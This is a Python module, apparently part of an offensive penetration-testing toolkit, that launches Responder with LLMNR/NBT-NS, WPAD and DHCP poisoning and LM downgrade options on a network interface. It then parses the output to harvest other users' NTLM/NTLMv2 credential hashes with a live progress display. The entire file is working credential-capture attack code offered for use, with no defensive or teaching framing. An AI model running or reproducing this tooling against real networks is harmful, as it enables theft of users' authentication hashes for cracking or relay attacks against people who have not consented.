"""
harvest.py — Passive NTLM/NTLMv2 hash capture via Responder
"""

import subprocess, threading, time, re, os
from . import tui

RESPONDER_PATH = "/usr/share/responder/Responder.py"
LOG_DIR        = "/var/log/responder"
NTLM_RE        = re.compile(
    r"(\S+)::([\w\-]+):([0-9a-fA-F]+):([0-9a-fA-F]+):([0-9a-fA-F]+)"
)

_proc   = None
_hashes = []
_lock   = threading.Lock()


def start(iface: str, timeout: int = 120):
    """
    Launch Responder in background. Returns captured hashes list (live-updating).
    Call stop() to kill Responder.
    """
    global _proc, _hashes
    _hashes = []

    if not os.path.exists(RESPONDER_PATH):
        tui.error("Responder not found — install: sudo apt install responder")
        return _hashes

    cmd = [
        "python3", RESPONDER_PATH,
        "-I", iface,
        "-wrdfP",       # wpad, rogue, dhcp, fingerprint, poisoning
        "--lm",
    ]

    tui.info(f"Starting Responder on {iface} (timeout {timeout}s) ...")
    _proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    t = threading.Thread(target=_reader, daemon=True)
    t.start()

    return _hashes


def _reader():
    global _proc, _hashes
    for line in _proc.stdout:
        m = NTLM_RE.search(line)
        if m:
            user   = m.group(1)
            domain = m.group(2)
            hash_  = f"{user}::{domain}:{m.group(3)}:{m.group(4)}:{m.group(5)}"
            with _lock:
                if hash_ not in _hashes:
                    _hashes.append(hash_)
                    tui.success(f"Hash captured: {tui.YLW}{user}@{domain}{tui.R}")


def stop():
    global _proc
    if _proc:
        _proc.terminate()
        _proc = None
        tui.info("Responder stopped.")


def captured() -> list[str]:
    with _lock:
        return list(_hashes)


def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
    """Block for `timeout` seconds while Responder runs, then stop and return hashes."""
    start(iface, timeout)
    deadline = time.time() + timeout
    bar_w = 40
    while time.time() < deadline:
        elapsed  = timeout - (deadline - time.time())
        filled   = int(bar_w * elapsed / timeout)
        bar      = f"{'█' * filled}{'░' * (bar_w - filled)}"
        count    = len(captured())
        print(
            f"\r  {tui.RED}[{bar}]{tui.R}  "
            f"{tui.DIM}{int(elapsed):>3}s  {tui.GRN}{count} hash(es){tui.R}   ",
            end="", flush=True
        )
        time.sleep(1)
    print()
    stop()
    return captured()
